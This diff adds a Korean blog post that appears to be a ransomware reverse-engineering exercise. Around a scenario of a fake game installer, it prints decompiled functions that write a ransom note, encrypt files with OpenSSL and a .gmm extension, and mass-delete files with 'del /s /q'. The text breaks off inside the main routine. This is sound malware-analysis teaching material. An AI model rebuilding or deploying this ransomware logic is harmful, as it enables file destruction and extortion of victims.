@@ -1,0 +1,525 @@
+I"<h2 id="시나리오">시나리오</h2>
+
+<font size="3">
+신일이는 최근 가장 잘나가는 게임인 gmm을 하고싶지만 구매하기에는 돈이 아까워했다.
+그래서 인터넷에 gmm 무료 설치파일을 발견하고 다운로드 받았다.
+"설치방법.txt"에 나온대로 "GMM1.exe"를 관리자 권한으로 실행하였다.
+하지만 그 파일은 사실 랜섬웨어였고 신일이의 PC는 랜섬웨어에 감염이 되고만다.
+감염 후 자신의 행동을 반성하고자 gmm 사이트에 접속하여 랜섬웨어 분석 공부를 시작하게 되었는데...
+</font>
+
+<h1 id="분석-순서">분석 순서</h1>
+
+<ol>
+  <li>vm에 ova(or ovf) 파일을 import한다.</li>
+  <li>“basic-0” 스냅샷으로 이동한다.</li>
+  <li>전원을 키고 바탕화면에 있는 GMM1.exe를 관리자 권한으로 실행한다.</li>
+  <li>실행 후 변화를 인지하고 스냅샷 “basic-0”으로 돌아온다.</li>
+  <li>랜섬웨어인 GMM1.exe을 분석해본다.</li>
+</ol>
+
+<h2 id="랜섬노트-생성">랜섬노트 생성</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FUN_004118f0</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">_Count</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">_File</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_dc</span> <span class="p">[</span><span class="mi">49</span><span class="p">];</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">local_c</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uStack8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x36</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_dc</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d01f</span><span class="p">);</span>
+  <span class="n">setlocale</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">local_c</span> <span class="o">=</span>
+  <span class="s">L"************------______GiveMeMoney______------************</span><span class="se">\n\n</span><span class="s">귀하의 중요한 파일이 암호화됩니다.</span><span class="se">\n</span><span class="s">문서, 사진, 비디오, 데이터베이스 및 기타 파일은 암호화 되어있어 더 이상 엑세스 할 수 없습니다. 파일을 복구 할 수있는 방법을 찾느라 시간을 낭비하지 않아도 됩니다. 누구도 암호 해독 서비스 없이 파일을 복구 할 수 없습니다.</span><span class="se">\n\n</span><span class="s">확실하게 모든파일을 안전하고 쉽게 복구 할 수 있습니다. 일부 파일은 무료로 해독 할 수 있습니다. 그러나 모든 파일의 암호를 해독하려면 돈을지불해야합니다. 돈을 지불하는 데는 3일 밖에 남지 않았습니다. 그 후 가격이 배가 됩니다. 돈을 지불하여 파일을복구하십시오.</span><span class="se">\n\n</span><span class="s">---------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s">Yourimportant files will be encrypted.</span><span class="se">\n</span><span class="s">Documents, photos, videos, databases, and other files areencrypted and cannot be accessed anymore. You don</span><span class="se">\'</span><span class="s">t have to waste time finding ways to recoverfiles. No one can recover files without decryption.</span><span class="se">\n\n</span><span class="s">Recover all your files securely andeasily. Some files can be decrypted free of charge. However, you will have to pay to decrypt allfiles. There are only three days left to pay. After that, the price will double. Pay the money torecover thefiles.</span><span class="se">\n\n</span><span class="s">---------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s">你的重要文件将被加密。</span><span class="se">\n</span><span class="s">文件,照片..."</span> <span class="cm">/* TRUNCATED STRING LITERAL */</span>
+  <span class="p">;</span>
+  <span class="n">_wfopen</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">gmm</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">ransomnote.txt"</span><span class="p">,</span><span class="s">L"w+, ccs=UTF-8"</span><span class="p">);</span>
+  <span class="n">_File</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="n">_File</span><span class="p">;</span>
+  <span class="n">wcslen</span><span class="p">(</span><span class="n">local_c</span><span class="p">);</span>
+  <span class="n">_Count</span> <span class="o">=</span> <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="n">local_c</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">_Count</span><span class="p">,</span><span class="n">_File</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">uStack8</span> <span class="o">=</span> <span class="mh">0x4119b0</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="파일-지우기">파일 지우기</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">FUN_004119f0</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_e8</span> <span class="p">[</span><span class="mi">49</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_24</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_c</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uStack8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x39</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_e8</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d01f</span><span class="p">);</span>
+  <span class="n">Sleep</span><span class="p">(</span><span class="mi">180000</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">local_c</span> <span class="o">=</span> <span class="s">"del /s /q </span><span class="se">\"</span><span class="s">"</span><span class="p">;</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="s">"*.gmm</span><span class="se">\"</span><span class="s">"</span><span class="p">;</span>
+  <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+  <span class="n">local_24</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">local_24</span><span class="p">,</span><span class="n">local_c</span><span class="p">);</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">local_24</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">local_24</span><span class="p">,</span><span class="n">local_18</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"cls"</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"EXIT"</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">uStack8</span> <span class="o">=</span> <span class="mh">0x411ad7</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="aes-키생성">AES 키생성(?)</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__cdecl</span>
+<span class="nf">FUN_00411b20</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_4</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_5</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">unaff_EDI</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">uVar3</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_69c</span> <span class="p">[</span><span class="mi">145</span><span class="p">];</span>
+  <span class="n">undefined4</span> <span class="n">local_458</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_44c</span> <span class="p">[</span><span class="mi">552</span><span class="p">];</span>
+  <span class="n">undefined</span> <span class="n">local_224</span> <span class="p">[</span><span class="mi">520</span><span class="p">];</span>
+  <span class="kt">size_t</span> <span class="n">local_1c</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x1a6</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_69c</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_0041a01c</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d01f</span><span class="p">);</span>
+  <span class="n">local_458</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">();</span>
+  <span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">local_458</span><span class="p">,</span><span class="n">param_3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">param_4</span><span class="p">,</span><span class="n">param_5</span><span class="p">);</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">fread</span><span class="p">(</span><span class="n">local_224</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
+    <span class="n">local_10</span> <span class="o">=</span> <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+    <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span><span class="p">)</span><span class="n">unaff_EDI</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">local_458</span><span class="p">,</span><span class="n">local_44c</span><span class="p">,</span><span class="n">local_1c</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"EVP_EncryptFinal_ex() error.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar3</span><span class="p">);</span>
+        <span class="n">EVP_CIPHER_CTX_reset</span><span class="p">(</span><span class="n">local_458</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">fwrite</span><span class="p">(</span><span class="n">local_44c</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">local_1c</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">param_2</span><span class="p">);</span>
+        <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="n">EVP_CIPHER_CTX_reset</span><span class="p">(</span><span class="n">local_458</span><span class="p">);</span>
+      <span class="p">}</span>
+<span class="nl">LAB_00411c91:</span>
+      <span class="n">thunk_FUN_00412e7f</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00411cc0</span><span class="p">);</span>
+      <span class="n">thunk_FUN_00412f60</span><span class="p">();</span>
+      <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0x411cbc</span><span class="p">;</span>
+      <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">EVP_EncryptUpdate</span><span class="p">(</span><span class="n">local_458</span><span class="p">,</span><span class="n">local_44c</span><span class="p">,</span><span class="n">local_1c</span><span class="p">,</span><span class="n">local_224</span><span class="p">,</span><span class="n">local_10</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"EVP_EncryptUpdate() error.</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="n">unaff_EDI</span><span class="p">);</span>
+      <span class="n">EVP_CIPHER_CTX_reset</span><span class="p">(</span><span class="n">local_458</span><span class="p">);</span>
+      <span class="k">goto</span> <span class="n">LAB_00411c91</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="n">local_44c</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">local_1c</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">param_2</span><span class="p">);</span>
+    <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="파일-암호화">파일 암호화(?)</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */</span>
+
+<span class="kt">void</span> <span class="kr">__cdecl</span>
+<span class="nf">FUN_00411d80</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_4</span><span class="p">,</span>
+            <span class="n">undefined4</span> <span class="n">param_5</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_String</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_3c4</span> <span class="p">[</span><span class="mi">97</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">local_240</span> <span class="p">[</span><span class="mi">268</span><span class="p">];</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_134</span><span class="p">;</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_128</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_11c</span> <span class="p">[</span><span class="mi">268</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0xf0</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_3c4</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_0041a01c</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d01f</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_0041a18c</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">local_240</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x104</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="n">thunk_FUN_004120e0</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">DAT_0041a18c</span> <span class="o">!=</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">thunk_FUN_00411d80</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">,</span><span class="n">param_4</span><span class="p">,</span><span class="n">param_5</span><span class="p">);</span>
+      <span class="k">goto</span> <span class="n">LAB_00411fc7</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">local_10</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">_DAT_0041a188</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">DAT_0041a18c</span> <span class="o">!=</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">_String</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_004121f0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041a18c</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">);</span>
+      <span class="n">_strlwr</span><span class="p">(</span><span class="n">_String</span><span class="p">);</span>
+      <span class="n">_String</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_00412150</span><span class="p">(</span><span class="n">_String</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fopen</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
+        <span class="n">local_128</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">local_128</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">local_240</span><span class="p">,</span><span class="n">local_11c</span><span class="p">);</span>
+        <span class="n">strcat</span><span class="p">(</span><span class="n">local_240</span><span class="p">,</span><span class="s">".gmm"</span><span class="p">);</span>
+        <span class="n">fopen</span><span class="p">(</span><span class="n">local_240</span><span class="p">,</span><span class="s">"wb"</span><span class="p">);</span>
+        <span class="n">local_134</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">local_134</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_00411b20</span><span class="p">(</span><span class="n">local_128</span><span class="p">,</span><span class="n">local_134</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_4</span><span class="p">,</span><span class="n">param_5</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">local_128</span><span class="p">);</span>
+        <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">local_134</span><span class="p">);</span>
+        <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="n">remove</span><span class="p">(</span><span class="n">local_11c</span><span class="p">);</span>
+        <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="nl">LAB_00411fc7:</span>
+  <span class="n">thunk_FUN_00412e7f</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00411ff8</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412f60</span><span class="p">();</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0x411ff2</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="main">MAIN</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FUN_00412460</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">unaff_DI</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar3</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_47c</span> <span class="p">[</span><span class="mi">97</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_2f8</span><span class="p">;</span>
+  <span class="n">uchar</span> <span class="o">*</span><span class="n">local_2ec</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_2e8</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_2e4</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_2e0</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_2dc</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_2d0</span> <span class="p">[</span><span class="mi">268</span><span class="p">];</span>
+  <span class="n">undefined4</span> <span class="n">local_1c4</span> <span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+  <span class="n">undefined</span> <span class="n">local_1aa</span> <span class="p">[</span><span class="mi">242</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_b8</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_ac</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_a0</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_94</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+  <span class="n">undefined</span> <span class="n">local_7c</span> <span class="p">[</span><span class="mi">72</span><span class="p">];</span>
+  <span class="kt">size_t</span> <span class="n">local_34</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_19</span><span class="p">;</span>
+  <span class="n">HWND</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x11e</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_47c</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_0041a01c</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+	  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d045</span><span class="p">);</span> <span class="c1">// GetCurrentThreadId()</span>
